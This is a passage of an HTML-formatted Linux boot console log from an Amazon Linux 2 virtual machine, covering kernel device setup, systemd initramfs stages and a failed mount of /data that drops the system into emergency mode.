PNP0A03:00: _OSC failed (AE_NOT_FOUND); disabling ASPM</span><br><span class="line">[    0.312008] acpi PNP0A03:00: fail to add MMCONFIG information, can&apos;t access extended PCI configuration space under this bridge.</span><br><span class="line">[    0.320313] acpiphp: Slot [3] registered</span><br><span class="line">[    0.324004] acpiphp: Slot [4] registered</span><br><span class="line">[    0.324041] acpiphp: Slot [5] registered</span><br><span class="line">[    0.328007] acpiphp: Slot [6] registered</span><br><span class="line">[    0.332038] acpiphp: Slot [7] registered</span><br><span class="line">[    0.336007] acpiphp: Slot [8] registered</span><br><span class="line">[    0.340038] acpiphp: Slot [9] registered</span><br><span class="line">[    0.343232] acpiphp: Slot [10] registered</span><br><span class="line">[    0.344038] acpiphp: Slot [11] registered</span><br><span class="line">[    0.348003] acpiphp: Slot [12] registered</span><br><span class="line">[    0.352038] acpiphp: Slot [13] registered</span><br><span class="line">[    0.356003] acpiphp: Slot [14] registered</span><br><span class="line">[    0.356038] acpiphp: Slot [15] registered</span><br><span class="line">[    0.360007] acpiphp: Slot [16] registered</span><br><span class="line">[    0.364040] acpiphp: Slot [17] registered</span><br><span class="line">[    0.368007] acpiphp: Slot [18] registered</span><br><span class="line">[    0.372038] acpiphp: Slot [19] registered</span><br><span class="line">[    0.375269] acpiphp: Slot [20] registered</span><br><span class="line">[    0.376038] acpiphp: Slot [21] registered</span><br><span class="line">[    0.380003] acpiphp: Slot [22] registered</span><br><span class="line">[    0.384039] acpiphp: Slot [23] registered</span><br><span class="line">[    0.388004] acpiphp: Slot [24] registered</span><br><span class="line">[    0.392038] acpiphp: Slot [25] registered</span><br><span class="line">[    0.395231] acpiphp: Slot [26] registered</span><br><span class="line">[    0.396037] acpiphp: Slot [27] registered</span><br><span class="line">[    0.400007] acpiphp: Slot [28] registered</span><br><span class="line">[    0.404038] acpiphp: Slot [29] registered</span><br><span class="line">[    0.408006] acpiphp: Slot [30] registered</span><br><span class="line">[    0.408038] acpiphp: Slot [31] registered</span><br><span class="line">[    0.412003] PCI host bridge to bus 0000:00</span><br><span class="line">[    0.416006] pci_bus 0000:00: root bus resource [io  0x0000-0x0cf7 window]</span><br><span class="line">[    0.420003] pci_bus 0000:00: root bus resource [io  0x0d00-0xffff window]</span><br><span class="line">[    0.424006] pci_bus 0000:00: root bus resource [mem 0x000a0000-0x000bffff window]</span><br><span class="line">[    0.432006] pci_bus 0000:00: root bus resource [mem 0x80000000-0xfebfffff window]</span><br><span class="line">[    0.436003] pci_bus 0000:00: root bus resource [bus 00-ff]</span><br><span class="line">[    0.444003] pci 0000:00:01.3: quirk: [io  0xb000-0xb03f] claimed by PIIX4 ACPI</span><br><span class="line">[    0.448020] pci 0000:00:01.3: quirk: [io  0xb100-0xb10f] claimed by PIIX4 SMB</span><br><span class="line">[    0.452065] pci 0000:00:01.3: PIIX4 devres E PIO at fff0-ffff</span><br><span class="line">[    0.456005] pci 0000:00:01.3: PIIX4 devres F MMIO at ffc00000-ffffffff</span><br><span class="line">[    0.460020] pci 0000:00:01.3: PIIX4 devres G PIO at fff0-ffff</span><br><span class="line">[    0.464006] pci 0000:00:01.3: PIIX4 devres H MMIO at ffc00000-ffffffff</span><br><span class="line">[    0.468020] pci 0000:00:01.3: PIIX4 devres I PIO at fff0-ffff</span><br><span class="line">[    0.472006] pci 0000:00:01.3: PIIX4 devres J PIO at fff0-ffff</span><br><span class="line">[    0.500026] ACPI: PCI Interrupt Link [LNKA] (IRQs 5 *10 11)</span><br><span class="line">[    0.504095] ACPI: PCI Interrupt Link [LNKB] (IRQs 5 *10 11)</span><br><span class="line">[    0.508003] ACPI: PCI Interrupt Link [LNKC] (IRQs 5 10 *11)</span><br><span class="line">[    0.512093] ACPI: PCI Interrupt Link [LNKD] (IRQs 5 10 *11)</span><br><span class="line">[    0.516003] ACPI: PCI Interrupt Link [LNKS] (IRQs *9)</span><br><span class="line">[    0.520396] pci 0000:00:03.0: vgaarb: setting as boot VGA device</span><br><span class="line">[    0.524000] pci 0000:00:03.0: vgaarb: VGA device added: decodes=io+mem,owns=io+mem,locks=none</span><br><span class="line">[    0.528009] pci 0000:00:03.0: vgaarb: bridge control possible</span><br><span class="line">[    0.531882] vgaarb: loaded</span><br><span class="line">[    0.536099] EDAC MC: Ver: 3.0.0</span><br><span class="line">[    0.540018] PCI: Using ACPI for IRQ routing</span><br><span class="line">[    0.544049] NetLabel: Initializing</span><br><span class="line">[    0.544049] NetLabel:  domain hash size = 128</span><br><span class="line">[    0.548007] NetLabel:  protocols = UNLABELED CIPSOv4 CALIPSO</span><br><span class="line">[    0.552003] NetLabel:  unlabeled traffic allowed by default</span><br><span class="line">[    0.556122] clocksource: Switched to clocksource kvm-clock</span><br><span class="line">[    0.566513] VFS: Disk quotas dquot_6.6.0</span><br><span class="line">[    0.569636] VFS: Dquot-cache hash table entries: 512 (order 0, 4096 bytes)</span><br><span class="line">[    0.573949] pnp: PnP ACPI init</span><br><span class="line">[    0.577127] pnp: PnP ACPI: found 5 devices</span><br><span class="line">[    0.586991] clocksource: acpi_pm: mask: 0xffffff max_cycles: 0xffffff, max_idle_ns: 2085701024 ns</span><br><span class="line">[    0.593447] NET: Registered protocol family 2</span><br><span class="line">[    0.596827] TCP established hash table entries: 8192 (order: 4, 65536 bytes)</span><br><span class="line">[    0.601178] TCP bind hash table entries: 8192 (order: 5, 131072 bytes)</span><br><span class="line">[    0.605283] TCP: Hash tables configured (established 8192 bind 8192)</span><br><span class="line">[    0.609392] UDP hash table entries: 512 (order: 2, 16384 bytes)</span><br><span class="line">[    0.613294] UDP-Lite hash table entries: 512 (order: 2, 16384 bytes)</span><br><span class="line">[    0.617337] NET: Registered protocol family 1</span><br><span class="line">[    0.620618] pci 0000:00:00.0: Limiting direct PCI/PCI transfers</span><br><span class="line">[    0.624485] pci 0000:00:01.0: Activating ISA DMA hang workarounds</span><br><span class="line">[    0.628534] pci 0000:00:03.0: Video device with shadowed ROM at [mem 0x000c0000-0x000dffff]</span><br><span class="line">[    0.634806] Unpacking initramfs...</span><br><span class="line">[    0.709848] Freeing initrd memory: 30596K</span><br><span class="line">[    0.713066] clocksource: tsc: mask: 0xffffffffffffffff max_cycles: 0x240937b9988, max_idle_ns: 440795218083 ns</span><br><span class="line">[    0.720381] Scanning for low memory corruption every 60 seconds</span><br><span class="line">[    0.725642] audit: initializing netlink subsys (disabled)</span><br><span class="line">[    0.729436] audit: type=2000 audit(1573791346.804:1): state=initialized audit_enabled=0 res=1</span><br><span class="line">[    0.729734] Initialise system trusted keyrings</span><br><span class="line">[    0.739406] Key type blacklist registered</span><br><span class="line">[    0.742581] workingset: timestamp_bits=36 max_order=18 bucket_order=0</span><br><span class="line">[    0.747973] zbud: loaded</span><br><span class="line">[    0.878144] Key type asymmetric registered</span><br><span class="line">[    0.881355] Asymmetric key parser &apos;x509&apos; registered</span><br><span class="line">[    0.884906] Block layer SCSI generic (bsg) driver version 0.4 loaded (major 251)</span><br><span class="line">[    0.890983] io scheduler noop registered (default)</span><br><span class="line">[    0.894504] io scheduler cfq registered</span><br><span class="line">[    0.897882] crc32: CRC_LE_BITS = 64, CRC_BE BITS = 64</span><br><span class="line">[    0.901483] crc32: self tests passed, processed 225944 bytes in 127555 nsec</span><br><span class="line">[    0.905982] crc32c: CRC_LE_BITS = 64</span><br><span class="line">[    0.908979] crc32c: self tests passed, processed 225944 bytes in 63858 nsec</span><br><span class="line">[    0.922989] crc32_combine: 8373 self tests passed</span><br><span class="line">[    0.936100] crc32c_combine: 8373 self tests passed</span><br><span class="line">[    0.939858] Serial: 8250/16550 driver, 4 ports, IRQ sharing disabled</span><br><span class="line">[    0.971398] 00:04: ttyS0 at I/O 0x3f8 (irq = 4, base_baud = 115200) is a 16550A</span><br><span class="line">[    0.977896] i8042: PNP: PS/2 Controller [PNP0303:KBD,PNP0f13:MOU] at 0x60,0x64 irq 1,12</span><br><span class="line">[    0.984358] i8042: Warning: Keylock active</span><br><span class="line">[    2.152313] serio: i8042 KBD port at 0x60,0x64 irq 1</span><br><span class="line">[    2.156011] rtc_cmos 00:00: RTC can wake from S4</span><br><span class="line">[    2.159970] rtc_cmos 00:00: rtc core: registered rtc_cmos as rtc0</span><br><span class="line">[    2.164141] rtc_cmos 00:00: alarms up to one day, 114 bytes nvram</span><br><span class="line">[    2.168217] hidraw: raw HID events driver (C) Jiri Kosina</span><br><span class="line">[    2.171981] NET: Registered protocol family 17</span><br><span class="line">[    2.175597] sched_clock: Marking stable (2175546497, 0)-&gt;(2833341676, -657795179)</span><br><span class="line">[    2.181815] registered taskstats version 1</span><br><span class="line">[    2.185058] Loading compiled-in X.509 certificates</span><br><span class="line">[    2.190503] Loaded X.509 cert &apos;Build time autogenerated kernel key: 6299c6d6e1a24aa79e34ed5acce2ba03c8deb4ff&apos;</span><br><span class="line">[    2.197476] zswap: loaded using pool lzo/zbud</span><br><span class="line">[    2.200898] ima: No TPM chip found, activating TPM-bypass! (rc=-19)</span><br><span class="line">[    2.204994] ima: Allocated hash algorithm: sha1</span><br><span class="line">[    2.208792] rtc_cmos 00:00: setting system clock to 2019-11-15 04:15:48 UTC (1573791348)</span><br><span class="line">[    2.216860] Freeing unused kernel memory: 2084K</span><br><span class="line">[    2.236110] Write protecting the kernel read-only data: 16384k</span><br><span class="line">[    2.240773] Freeing unused kernel memory: 2016K</span><br><span class="line">[    2.246592] Freeing unused kernel memory: 1332K</span><br><span class="line">[    2.280262] systemd[1]: Inserted module &apos;autofs4&apos;</span><br><span class="line">[    2.295095] NET: Registered protocol family 10</span><br><span class="line">[    2.300020] Segment Routing with IPv6</span><br><span class="line">[    2.303123] systemd[1]: Inserted module &apos;ipv6&apos;</span><br><span class="line">[    2.307232] random: systemd: uninitialized urandom read (16 bytes read)</span><br><span class="line">[    2.311686] random: systemd: uninitialized urandom read (16 bytes read)</span><br><span class="line">[    2.315990] random: systemd: uninitialized urandom read (16 bytes read)</span><br><span class="line">[    2.322766] systemd[1]: systemd 219 running in system mode. (+PAM +AUDIT +SELINUX +IMA -APPARMOR +SMACK +SYSVINIT +UTMP +LIBCRYPTSETUP +GCRYPT +GNUTLS +ACL +XZ +LZ4 -SECCOMP +BLKID +ELFUTILS +KMOD +IDN)</span><br><span class="line">[    2.334502] systemd[1]: Detected virtualization kvm.</span><br><span class="line">[    2.338073] systemd[1]: Detected architecture x86-64.</span><br><span class="line">[    2.341654] systemd[1]: Running in initial RAM disk.</span><br><span class="line"></span><br><span class="line">Welcome to [0;34mAmazon Linux 2 dracut-033-535.amzn2.1.3 (Initramfs)[0m!</span><br><span class="line"></span><br><span class="line">[    2.347316] systemd[1]: No hostname configured.</span><br><span class="line">[    2.350694] systemd[1]: Set hostname to &lt;localhost&gt;.</span><br><span class="line">[    2.354276] systemd[1]: Initializing machine ID from KVM UUID.</span><br><span class="line">[[32m  OK  [0m] Reached target Local Encrypted Volumes.</span><br><span class="line">[    2.384614] systemd[1]: Reached target Local Encrypted Volumes.</span><br><span class="line">[    2.388594] systemd[1]: Starting Local Encrypted Volumes.</span><br><span class="line">[[32m  OK  [0m] Reached target Timers.</span><br><span class="line">[    2.393517] systemd[1]: Reached target Timers.</span><br><span class="line">[[32m  OK  [0m] Reached target Local File Systems.</span><br><span class="line">[[32m  OK  [0m] Reached target Swap.</span><br><span class="line">[[32m  OK  [0m] Created slice Root Slice.</span><br><span class="line">[[32m  OK  [0m] Listening on udev Control Socket.</span><br><span class="line">[[32m  OK  [0m] Listening on Journal Socket.</span><br><span class="line">[[32m  OK  [0m] Created slice System Slice.</span><br><span class="line">         Starting Create list of required st... nodes for the current kernel...</span><br><span class="line">         Starting Setup Virtual Console...</span><br><span class="line">         Starting Apply Kernel Variables...</span><br><span class="line">         Starting Journal Service...</span><br><span class="line">[[32m  OK  [0m] Reached target Slices.</span><br><span class="line">         Starting dracut cmdline hook...</span><br><span class="line">[[32m  OK  [0m] Listening on udev Kernel Socket.</span><br><span class="line">[[32m  OK  [0m] Reached target Sockets.</span><br><span class="line">[[32m  OK  [0m] Started Journal Service.</span><br><span class="line">[[32m  OK  [0m] Started Create list of required sta...ce nodes for the current kernel.</span><br><span class="line">[[32m  OK  [0m] Started Setup Virtual Console.</span><br><span class="line">[[32m  OK  [0m] Started Apply Kernel Variables.</span><br><span class="line">         Starting Create Static Device Nodes in /dev...</span><br><span class="line">[[32m  OK  [0m] Started Create Static Device Nodes in /dev.</span><br><span class="line">[[32m  OK  [0m] Started dracut cmdline hook.</span><br><span class="line">         Starting dracut pre-udev hook...</span><br><span class="line">[    2.512333] device-mapper: uevent: version 1.0.3</span><br><span class="line">[    2.515930] device-mapper: ioctl: 4.37.0-ioctl (2017-09-20) initialised: dm-devel@redhat.com</span><br><span class="line">[[32m  OK  [0m] Started dracut pre-udev hook.</span><br><span class="line">         Starting udev Kernel Device Manager...</span><br><span class="line">[[32m  OK  [0m] Started udev Kernel Device Manager.</span><br><span class="line">         Starting dracut pre-trigger hook...</span><br><span class="line">[[32m  OK  [0m] Started dracut pre-trigger hook.</span><br><span class="line">         Starting udev Coldplug all Devices...</span><br><span class="line">[[32m  OK  [0m] Started udev Coldplug all Devices.</span><br><span class="line">         Starting dracut initqueue hook...</span><br><span class="line">         Starting Show Plymouth Boot Screen...</span><br><span class="line">[[32m  OK  [0m] Reached target System Initialization.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Started Show Plymouth Boot Screen.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Reached target Paths.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Reached target Basic System.</span><br><span class="line"></span><br><span class="line">[    2.671676] nvme nvme0: pci function 0000:00:04.0</span><br><span class="line">[    2.675603] ACPI: PCI Interrupt Link [LNKD] enabled at IRQ 11</span><br><span class="line">[    2.676101] nvme nvme1: pci function 0000:00:1f.0</span><br><span class="line">[    2.683714] ACPI: PCI Interrupt Link [LNKC] enabled at IRQ 10</span><br><span class="line">[    2.690459] input: AT Translated Set 2 keyboard as /devices/platform/i8042/serio0/input/input0</span><br><span class="line">[    2.697051] AVX2 version of gcm_enc/dec engaged.</span><br><span class="line">[    2.700874] AES CTR mode by8 optimization enabled</span><br><span class="line">%G[    2.723678] alg: No test for pcbc(aes) (pcbc-aes-aesni)</span><br><span class="line">[    2.903158]  nvme0n1: p1 p128</span><br><span class="line">[    2.916394] random: fast init done</span><br><span class="line">[[32m  OK  [0m] Found device /dev/disk/by-uuid/0a5c8d10-5fd5-4c87-8778-4afc3ce97dd9.</span><br><span class="line"></span><br><span class="line">         Starting File System Check on /dev/...0-5fd5-4c87-8778-4afc3ce97dd9...</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Started File System Check on /dev/d...d10-5fd5-4c87-8778-4afc3ce97dd9.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Started dracut initqueue hook.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Reached target Remote File Systems (Pre).</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Reached target Remote File Systems.</span><br><span class="line"></span><br><span class="line">         Starting dracut pre-mount hook...</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Started dracut pre-mount hook.</span><br><span class="line"></span><br><span class="line">         Mounting /sysroot...</span><br><span class="line"></span><br><span class="line">[    3.332526] SGI XFS with ACLs, security attributes, no debug enabled</span><br><span class="line">[    3.440566] XFS (nvme0n1p1): Mounting V5 Filesystem</span><br><span class="line">[    3.883852] XFS (nvme0n1p1): Ending clean mount</span><br><span class="line">[[32m  OK  [0m] Mounted /sysroot.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Reached target Initrd Root File System.</span><br><span class="line"></span><br><span class="line">         Starting Reload Configuration from the Real Root...</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Started Reload Configuration from the Real Root.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Reached target Initrd File Systems.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Reached target Initrd Default Target.</span><br><span class="line"></span><br><span class="line">         Starting dracut pre-pivot and cleanup hook...</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Started dracut pre-pivot and cleanup hook.</span><br><span class="line"></span><br><span class="line">         Starting Cleaning Up and Shutting Down Daemons...</span><br><span class="line"></span><br><span class="line">         Starting Plymouth switch root service...</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Stopped target Timers.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Stopped Cleaning Up and Shutting Down Daemons.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Stopped dracut pre-pivot and cleanup hook.</span><br><span class="line"></span><br><span class="line">         Stopping dracut pre-pivot and cleanup hook...</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Stopped dracut pre-mount hook.</span><br><span class="line"></span><br><span class="line">         Stopping dracut pre-mount hook...</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Stopped target Initrd Default Target.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Stopped target Remote File Systems.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Stopped target Remote File Systems (Pre).</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Stopped dracut initqueue hook.</span><br><span class="line"></span><br><span class="line">         Stopping dracut initqueue hook...</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Stopped target Basic System.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Stopped target Slices.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Stopped target Sockets.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Stopped target Paths.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Stopped target System Initialization.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Stopped target Local File Systems.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Stopped target Local Encrypted Volumes.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Stopped target Swap.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Stopped udev Coldplug all Devices.</span><br><span class="line"></span><br><span class="line">         Stopping udev Coldplug all Devices...</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Stopped dracut pre-trigger hook.</span><br><span class="line"></span><br><span class="line">         Stopping dracut pre-trigger hook...</span><br><span class="line"></span><br><span class="line">         Stopping udev Kernel Device Manager...</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Stopped Apply Kernel Variables.</span><br><span class="line"></span><br><span class="line">         Stopping Apply Kernel Variables...</span><br><span class="line"></span><br><span class="line">[    4.113588] systemd-journald[673]: Received SIGTERM from PID 1 (systemd).</span><br><span class="line">[[32m  OK  [0m] Started Plymouth switch root service.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Stopped udev Kernel Device Manager.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Stopped Create Static Device Nodes in /dev.</span><br><span class="line"></span><br><span class="line">         Stopping Create Static Device Nodes in /dev...</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Stopped Create list of required sta...ce nodes for the current kernel.</span><br><span class="line"></span><br><span class="line">         Stopping Create list of required st... nodes for the current kernel...</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Stopped dracut pre-udev hook.</span><br><span class="line"></span><br><span class="line">         Stopping dracut pre-udev hook...</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Stopped dracut cmdline hook.</span><br><span class="line"></span><br><span class="line">         Stopping dracut cmdline hook...</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Closed udev Kernel Socket.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Closed udev Control Socket.</span><br><span class="line"></span><br><span class="line">         Starting Cleanup udevd DB...</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Started Cleanup udevd DB.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Reached target Switch Root.</span><br><span class="line"></span><br><span class="line">         Starting Switch Root...</span><br><span class="line"></span><br><span class="line">[    4.168220] systemd: 25 output lines suppressed due to ratelimiting</span><br><span class="line">[    4.272567] SELinux:  Disabled at runtime.</span><br><span class="line">[    4.336112] audit: type=1404 audit(1573791350.624:2): selinux=0 auid=4294967295 ses=4294967295</span><br><span class="line">[    4.381684] ip_tables: (C) 2000-2006 Netfilter Core Team</span><br><span class="line">[    4.386502] systemd[1]: Inserted module &apos;ip_tables&apos;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Welcome to [0;33mAmazon Linux 2[0m!</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Stopped Switch Root.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Stopped Journal Service.</span><br><span class="line"></span><br><span class="line">         Starting Journal Service...</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Listening on LVM2 poll daemon socket.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Created slice system-selinux\x2dpol...grate\x2dlocal\x2dchanges.slice.</span><br><span class="line"></span><br><span class="line">         Mounting POSIX Message Queue File System...</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Listening on udev Control Socket.</span><br><span class="line"></span><br><span class="line">         Mounting Huge Pages File System...</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Listening on Device-mapper event daemon FIFOs.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Listening on LVM2 metadata daemon socket.</span><br><span class="line"></span><br><span class="line">         Starting Monitoring of LVM2 mirrors... dmeventd or progress polling...</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Created slice system-systemd\x2dfsck.slice.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Listening on /dev/initctl Compatibility Named Pipe.</span><br><span class="line"></span><br><span class="line">         Starting Remount Root and Kernel File Systems...</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Stopped target Switch Root.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Stopped target Initrd Root File System.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Stopped target Initrd File Systems.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Reached target Paths.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Reached target Swap.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Set up automount Arbitrary Executab...ats File System Automount Point.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Listening on udev Kernel Socket.</span><br><span class="line"></span><br><span class="line">[    4.624731] ena: Elastic Network Adapter (ENA) v2.1.1g</span><br><span class="line">[    4.624811] ena 0000:00:05.0: Elastic Network Adapter (ENA) v2.1.1g</span><br><span class="line">[    4.640142] ena: ena device version: 0.10</span><br><span class="line">[    4.640143] ena: ena controller version: 0.0.1 implementation version 1</span><br><span class="line">[    4.687575] systemd-journald[1391]: Received request to flush runtime journal from PID 1</span><br><span class="line">[[32m  OK  [0m] Created slice system-serial\x2dgetty.slice.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Created slice system-getty.slice.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Listening on Delayed Shutdown Socket.</span><br><span class="line"></span><br><span class="line">         Starting Load Kernel Modules...</span><br><span class="line"></span><br><span class="line">         Mounting Debug File System...</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Created slice User and Session Slice.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Reached target Slices.</span><br><span class="line"></span><br><span class="line">         Starting Create list of required st... nodes for the current kernel...</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Mounted Debug File System.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Mounted POSIX Message Queue File System.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Mounted Huge Pages File System.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Started Journal Service.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Started Remount Root and Kernel File Systems.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Started Create list of required sta...ce nodes for the current kernel.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Started LVM2 metadata daemon.</span><br><span class="line"></span><br><span class="line">         Starting LVM2 metadata daemon...</span><br><span class="line"></span><br><span class="line">         Starting Create Static Device Nodes in /dev...</span><br><span class="line"></span><br><span class="line">         Starting udev Coldplug all Devices...</span><br><span class="line"></span><br><span class="line">         Starting Load/Save Random Seed...</span><br><span class="line"></span><br><span class="line">         Starting Flush Journal to Persistent Storage...</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Started Load/Save Random Seed.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Started udev Coldplug all Devices.</span><br><span class="line"></span><br><span class="line">         Starting udev Wait for Complete Device Initialization...</span><br><span class="line"></span><br><span class="line">[    4.768025] ena 0000:00:05.0: LLQ is not supported Fallback to host mode policy.</span><br><span class="line">[    4.768044] ena 0000:00:05.0: creating 2 io queues. rx queue size: 1024 tx queue size. 1024 LLQ is DISABLED</span><br><span class="line">[    4.784169] ena 0000:00:05.0: Elastic Network Adapter (ENA) found at mem febf4000, mac addr 06:db:1b:e7:ab:1e Queues 2, Placement policy: Regular</span><br><span class="line">[[32m  OK  [0m] Started Create Static Device Nodes in /dev.</span><br><span class="line"></span><br><span class="line">         Starting udev Kernel Device Manager...</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Started udev Kernel Device Manager.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Started Load Kernel Modules.</span><br><span class="line"></span><br><span class="line">         Starting Apply Kernel Variables...</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Started Apply Kernel Variables.</span><br><span class="line"></span><br><span class="line">[    4.839083] input: Power Button as /devices/LNXSYSTM:00/LNXPWRBN:00/input/input1</span><br><span class="line">[    4.845300] ACPI: Power Button [PWRF]</span><br><span class="line">[    4.845401] input: Sleep Button as /devices/LNXSYSTM:00/LNXSLPBN:00/input/input2</span><br><span class="line">[    4.845410] ACPI: Sleep Button [SLPF]</span><br><span class="line">[[32m  OK  [0m] Started Flush Journal to Persistent Storage.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Found device /dev/ttyS0.</span><br><span class="line"></span><br><span class="line">%G[[32m  OK  [0m] Created slice system-ec2net\x2difup.slice.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Started udev Wait for Complete Device Initialization.</span><br><span class="line"></span><br><span class="line">         Starting Activation of DM RAID sets...</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Started Monitoring of LVM2 mirrors,...ng dmeventd or progress polling.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Reached target Local File Systems (Pre).</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Started Activation of DM RAID sets.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Reached target Local Encrypted Volumes.</span><br><span class="line"></span><br><span class="line">[[1;31m TIME [0m] Timed out waiting for device dev-xvdf.device.</span><br><span class="line"></span><br><span class="line">[[1;33mDEPEND[0m] Dependency failed for /data.</span><br><span class="line"></span><br><span class="line">[[1;33mDEPEND[0m] Dependency failed for Local File Systems.</span><br><span class="line"></span><br><span class="line">[[1;33mDEPEND[0m] Dependency failed for Migrate local... structure to the new structure.</span><br><span class="line"></span><br><span class="line">[[1;33mDEPEND[0m] Dependency failed for File System Check on /dev/xvdf.</span><br><span class="line"></span><br><span class="line">[   94.759235] random: crng init done</span><br><span class="line">[   94.762559] random: 7 urandom warning(s) missed due to ratelimiting</span><br><span class="line">         Starting Preprocess NFS configuration...</span><br><span class="line"></span><br><span class="line">         Starting Initial hibernation setup job...</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Reached target Timers.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Reached target Login Prompts.</span><br><span class="line"></span><br><span class="line">         Starting Create Volatile Files and Directories...</span><br><span class="line"></span><br><span class="line">         Starting Tell Plymouth To Write Out Runtime Data...</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Started Emergency Shell.</span><br><span class="line"></span><br><span class="line">         Starting Emergency Shell...</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Reached target Emergency Mode.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Reached target Sockets.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Reached target Network (Pre).</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Reached target Network.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Reached target Cloud-init target.</span><br><span class="line"></span><br><span class="line">         Starting Initial cloud-init job (metadata service crawler)...</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Started Preprocess NFS configuration.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Started Create Volatile Files and Directories.</span><br><span class="line"></span><br><span class="line">         Starting RPC bind service...</span><br><span class="line"></span><br><span class="line">         Mounting RPC Pipe File System...</span><br><span class="line"></span><br><span class="line">         Starting Security Auditing Service...</span><br><span class="line"></span><br><span class="line">[   94.838985] RPC: Registered named UNIX socket transport module.</span><br><span class="line">[   94.838985] RPC: Registered udp transport module.</span><br><span class="line">[   94.838986] RPC: Registered tcp transport module.</span><br><span class="line">[   94.838986] RPC: Registered tcp NFSv4.1 backchannel transport module.</span><br><span class="line">[[32m  OK  [0m] Mounted RPC Pipe File System.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Reached target rpc_pipefs.target.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] Reached target NFS client services.</span><br><span class="line"></span><br><span class="line">[[32m  OK  [0m] 